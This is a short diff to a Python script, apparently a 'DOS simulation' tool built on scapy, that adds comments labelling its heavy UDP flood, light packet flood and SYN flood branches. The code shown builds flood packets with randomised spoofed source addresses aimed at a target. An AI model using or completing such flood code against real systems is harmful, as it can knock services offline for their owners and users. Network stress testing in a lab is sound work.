@@ -19,7 +19,7 @@ if not (pkt_size):
 
 
 def dos_simulation(ip_src, ip_dst, pkt_size):
-
+    #  building packet for heavy packet flood
     ip_layer = scp.IP(src=scp.RandIP(), dst=ip_dst)
 
     if ip_src:
@@ -29,9 +29,12 @@ def dos_simulation(ip_src, ip_dst, pkt_size):
     raw_layer = scp.Raw(int(pkt_size))
 
     packet = ip_layer / udp_layer / raw_layer
+
+    #  building packet for light packet flood
     if attack_type == "2":
         packet = ip_layer
 
+    # building packet for syn packet flood
     if attack_type == "3":
         tcp_layer = scp.TCP(
             sport=80, dport=21, seq=random.randint(0, MAX_PORT), flags="S"
